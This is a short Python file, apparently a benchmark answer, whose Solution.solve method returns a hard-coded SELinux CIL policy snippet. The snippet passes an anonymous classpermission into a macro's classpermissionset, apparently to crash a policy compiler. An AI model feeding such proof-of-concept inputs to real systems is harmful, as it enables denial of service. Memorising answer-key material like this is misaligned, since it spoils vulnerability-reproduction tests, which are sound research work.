import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = """
(class mycls (p))

(macro trigger ((classpermission cp))
    (classpermissionset cps (cp))
)

(call trigger (cp (mycls (p))))
""".strip() + "\n"
        return poc.encode('utf-8')